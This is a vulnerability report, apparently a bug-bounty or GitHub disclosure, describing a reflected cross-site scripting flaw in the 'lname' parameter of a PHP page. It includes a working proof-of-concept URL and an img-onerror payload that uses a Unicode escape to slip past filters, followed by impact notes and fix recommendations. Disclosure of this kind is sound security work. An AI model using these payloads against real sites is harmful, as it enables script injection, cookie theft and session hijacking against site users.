# Reflected Cross-Site Scripting (XSS) via `lname` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `lname` parameter of the application. User-controlled input is reflected into the HTML response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

The vulnerability can be exploited using an `<img>` tag combined with an `onerror` event handler and Unicode escape sequence bypass.

---

## Vulnerable Endpoint

```text id="v7m2qa"
http://kzlabs.com/9.php?fname=adadsda&lname=%22%3E%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%282%29%3E
```

---

## Vulnerable Parameter

```text id="r4x8zn"
lname
```

---

## Payload Used

```html id="k9c1wp"
"><iMg src=x onerror=\u0063onfirm?.(2)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/9.php?fname=adadsda&lname=%22%3E%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%282%29%3E
   ```

2. Observe that the payload is reflected into the page without proper sanitization.

3. The injected `<img>` element triggers the `onerror` event handler.

4. JavaScript executes successfully and displays a popup dialog containing the value `2`.

---

## Proof of Concept

```text id="p5n7md"
http://kzlabs.com/9.php?fname=adadsda&lname=%22%3E%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%282%29%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/ecaaaa7a-f718-4db8-9ac3-6049f4d3bb8c" />

---

## Impact

* Arbitrary JavaScript execution
* Session hijacking
* Cookie theft
* Phishing attacks
* DOM manipulation in victim browser context

---

## Recommendations for Fix

* Properly encode output before rendering user input
* Sanitize and validate all user-controlled input
* Implement context-aware escaping
* Deploy a strict Content Security Policy (CSP)

